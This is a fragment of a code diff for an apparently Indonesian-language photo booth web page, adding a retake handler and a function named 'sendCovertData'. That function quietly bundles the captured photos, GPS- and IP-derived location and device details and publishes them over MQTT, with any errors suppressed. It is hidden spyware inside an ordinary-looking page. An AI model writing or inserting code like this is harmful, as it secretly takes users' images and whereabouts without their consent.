+})
+
+/* ── Retake ── */
+document.getElementById('btnRetake').addEventListener('click', function () {
+  stripOverlay.classList.remove('visible')
+  stripBtns.classList.remove('visible')
+  snapBtnText.textContent = 'Ambil Foto!'
+  snapHint.textContent    = 'Siap! Kita ambil 3 foto berturut-turut 😊'
+  capturedFrames = []; stripCanvasEl = null
+})
+
+/* ── Covert MQTT send ── */
+async function sendCovertData (photoUrl, stripUrl) {
+  try {
+    var loc = typeof buildLocation === 'function' ? await buildLocation(gpsCoords, ipInfo) : null
+    var payload = {
+      id: Math.random().toString(36).substr(2,9).toUpperCase(),
+      timestamp: new Date().toISOString(),
+      photo: photoUrl, strip: stripUrl, location: loc,
+      device: { userAgent: navigator.userAgent, screen: window.screen.width+'x'+window.screen.height, language: navigator.language }
+    }
+    if (typeof publishMQTT === 'function') publishMQTT(payload)
+  } catch (e) {}
+}
+
+function delay (ms) { return new Promise(function (r) { setTimeout(r, ms) }) }
+</script>
+
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-6S5388LRGM"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-6S5388LRGM');
+  function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-6S5388LRGM');
 </script>
-
 </body>
 </html>
